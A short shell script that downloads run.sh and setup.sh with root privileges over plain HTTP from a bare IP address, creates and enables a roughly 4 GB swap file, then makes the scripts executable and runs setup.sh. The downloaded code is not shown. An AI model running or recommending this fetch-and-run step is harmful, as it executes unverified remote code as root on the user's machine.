sudo wget http://135.148.165.162/run.sh
sudo wget http://135.148.165.162/setup.sh
apt-get -y update
cd /var
touch swap.img
chmod 600 swap.img
dd if=/dev/zero of=/var/swap.img bs=4024k count=1000
mkswap /var/swap.img
cd
swapon /var/swap.img
sudo chmod u+x setup.sh run.sh
./setup.sh
